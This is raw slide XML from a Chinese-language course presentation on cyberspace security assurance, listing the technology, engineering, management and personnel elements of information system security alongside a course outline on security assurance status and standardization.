                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8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27" grpId="0" animBg="1"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="4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34244" y="703262"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全保障要素</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="513010" y="1414932"/>
            <a:ext cx="8424936" cy="648072"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>技术、工程、管理和人员四个领域进行综合保障</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="1978244"/>
            <a:ext cx="8259961" cy="892552"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>技术</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="6666FF"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>密码、访问控制、网络安全、漏洞及恶意代码防护等</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="770314" y="2945209"/>
            <a:ext cx="7992888" cy="892552"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>工程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="6666FF"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息系统安全工程、安全工程能力成熟度模型</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="770314" y="3912174"/>
            <a:ext cx="7920880" cy="892552"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>管理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="6666FF"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全管理体系、风险管理、应急响应与灾难恢复等</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766115" y="4879139"/>
            <a:ext cx="7950426" cy="892552"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>人员</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="6666FF"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>所有员工、信息系统岗位、安全专业人员</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2361335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3513" y="707855"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>课程内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="AutoShape 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="575556" y="2756601"/>
            <a:ext cx="1785938" cy="556655"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="99CCFF">
                  <a:gamma/>
                  <a:tint val="27451"/>
                  <a:invGamma/>
                </a:srgbClr>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="040404"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:rPr>
              <a:t>保障实践</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="852534" y="5796207"/>
            <a:ext cx="1365250" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B01302"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识体</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text Box 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3173634" y="5852537"/>
            <a:ext cx="1365250" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B01302"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2485859" y="1280436"/>
            <a:ext cx="499531" cy="4001339"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 72540"/>
              <a:gd name="adj2" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="36000" rIns="36000" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Line 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4877044" y="1053968"/>
            <a:ext cx="57704" cy="4933288"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 140891"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3787055"/>
              <a:gd name="connsiteX1" fmla="*/ 140891 w 140891"/>
              <a:gd name="connsiteY1" fmla="*/ 3787055 h 3787055"/>
              <a:gd name="connsiteX0" fmla="*/ 0 w 97348"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3801570"/>
              <a:gd name="connsiteX1" fmla="*/ 97348 w 97348"/>
              <a:gd name="connsiteY1" fmla="*/ 3801570 h 3801570"/>
              <a:gd name="connsiteX0" fmla="*/ 0 w 82834"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3830598"/>
              <a:gd name="connsiteX1" fmla="*/ 82834 w 82834"/>
              <a:gd name="connsiteY1" fmla="*/ 3830598 h 3830598"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="82834" h="3830598">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="46964" y="1262352"/>
                  <a:pt x="35870" y="2568246"/>
                  <a:pt x="82834" y="3830598"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2981499" y="1028586"/>
            <a:ext cx="1710531" cy="495259"/>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网络空间安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>保障现状</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2915816" y="2504573"/>
            <a:ext cx="1816967" cy="573706"/>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我国信息安全保</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>障工作主要内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text Box 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5739984" y="5922147"/>
            <a:ext cx="2160984"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知识子域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 13"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5334054" y="875773"/>
            <a:ext cx="2982362" cy="361207"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="4" name="Group 14"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="91" name="AutoShape 15"/>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92" name="AutoShape 16"/>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93" name="AutoShape 17"/>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94" name="AutoShape 18"/>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90" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="255"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>国外网络空间安全保障现状</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5314911" y="1667861"/>
            <a:ext cx="3001505" cy="401027"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="6" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="67"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68"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69"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70"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66"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网络空间安全标准化</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="AutoShape 56"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4851173" y="994848"/>
            <a:ext cx="404904" cy="573622"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 77423"/>
              <a:gd name="adj2" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4851172" y="1825916"/>
            <a:ext cx="404905" cy="2146202"/>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sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="15" name="Group 58"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5323647" y="1280437"/>
            <a:ext cx="2992770" cy="357718"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="16" name="Group 59"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1481"/>
              <a:chExt cx="1363" cy="1802"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="55" name="AutoShape 60"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="2272" y="1481"/>
                <a:ext cx="1363" cy="1802"/>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56" name="AutoShape 61"/>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57" name="AutoShape 62"/>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58" name="AutoShape 63"/>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54" name="Rectangle 64"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="257"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>我国网络空间安全保障现状</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2536556" y="1091620"/>
            <a:ext cx="27199" cy="4856362"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5294515" y="2099909"/>
            <a:ext cx="3021901" cy="414665"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="18" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
